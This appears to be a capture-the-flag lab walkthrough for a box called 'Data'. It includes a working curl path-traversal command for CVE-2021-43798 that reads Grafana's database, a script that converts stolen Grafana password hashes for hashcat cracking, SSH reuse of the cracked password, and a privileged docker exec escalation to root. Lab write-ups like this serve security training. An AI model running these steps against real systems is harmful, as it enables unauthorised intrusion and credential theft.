# Data (easy)

## port scan

![](data\(easy\)/walkthrough\_20240409125154725.png)

## service enumeration

on port 3000. we have Grafana

![](data\(easy\)/walkthrough\_20240409125116741.png)

## exploit grafana

CVE-2021-43798 give us access to read local file

we can use `searchsploit -m 50581`

![](data\(easy\)/walkthrough\_20240409125319993.png)

we can change this exploit write out to file

![](data\(easy\)/walkthrough\_20240409125822967.png)

![](data\(easy\)/walkthrough\_20240409130007225.png)

or just use curl command

```bash
curl --path-as-is http://10.10.68.81:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

![](data\(easy\)/walkthrough\_20240409131056541.png)

![](data\(easy\)/walkthrough\_20240409131205244.png)

## crack grafana user password

```python
import base64

users = [
    "admin@localhost|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S",
    "boris@data.vl|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl"
]

def main():
    for user in users:
        userProperties = user.split("|");
        email = userProperties[0];
        hexHash = userProperties[1];
        salt = userProperties[2];

        decodedHash = bytes.fromhex(hexHash)
        hashB64 = base64.b64encode(decodedHash).decode('utf-8')
        saltB64 = base64.b64encode(bytes(salt, 'utf-8')).decode('utf-8')
        print(f"sha256:10000:{saltB64}:{hashB64}")



if __name__ == "__main__":
    main()
```

```bash
python3 ./decode.py > hash
sudo hashcat ./hash /usr/share/wordlists/rockyou.txt
```

the cred is `beautiful1`

![](data\(easy\)/walkthrough\_20240409132039226.png)

## ssh

we can use cracked password ssh into target

![](data\(easy\)/walkthrough\_20240409132148203.png)

## Privilege Escalation

we can use `/snap/bin/docker exec *` with root privilege

![](data\(easy\)/walkthrough\_20240409132333541.png)

```bash
sudo docker exec --privileged -i -u root -t grafana /bin/bash
```

and there have a disk `/dev/xvda1`. we can mount it to access host file system

![](data\(easy\)/walkthrough\_20240409135956780.png)
